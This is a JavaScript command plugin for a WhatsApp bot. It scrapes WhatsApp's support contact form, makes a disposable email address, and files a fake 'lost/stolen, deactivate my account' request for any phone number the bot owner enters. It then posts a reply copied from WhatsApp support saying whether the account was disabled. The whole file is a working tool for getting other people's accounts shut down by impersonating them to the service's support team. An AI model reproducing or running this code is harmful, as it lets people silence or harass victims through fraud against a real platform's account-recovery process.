import cheerio from "cheerio"
import axios from "axios"
import util from 'util'
let handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
const q = args.join(" ")    
if (!q || !args[0]) throw '*[❗] enter the number that you want to deactivate in international format, example +𝟷(𝟺𝟻0) 555-555*'
let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta: " + q)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({ url, method: "POST", data: form, headers: { cookie } })
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`##- WhatsApp Support -##\n\nHello,\n\nThank you for your message.\n\nWe have disabled your WhatsApp account. This means that your account is temporarily disabled and will be automatically deleted in 30 days if you don't re-register your account.Please note: WhatsApp Customer Support cannot delete your account manually.\n\nDuring the closure period:\n • Your contacts on WhatsApp may still see your name and profile photo.\n • Any messages your contacts may send to the account will remain in pending status for up to 30 days.\n\nIf you wish to recover your account, please re-register your account as soon as possible.\nRe-register your account by entering the 6-digit code, the code you receive by SMS or phone call.If you register again\n\nIf you have any other questions or concerns, please do not hesitate to contact us. We will be happy to help!` )
} else if (payload.includes(`"payload":false`)) {
m.reply(`##- WhatsApp Support -##\n\nHello,\n\nThank you for your message.\n\nTo proceed with your request, we need you to verify that this phone number belongs to you. Please send us documentation that allows us to verify ownership of the number, such as a copy of your phone bill or service contract.\n\nPlease make sure to enter your phone number in full international format.For more information on the international format, please refer to this article.\n\nIf you have any other questions or concerns, please do not hesitate to contact us, we will be happy to help you.`)
} else m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
handler.command =/^(supportwa|swa|soporte|support|desactivarwa|mandsupport)$/i
handler.rowner = true 
export default handler
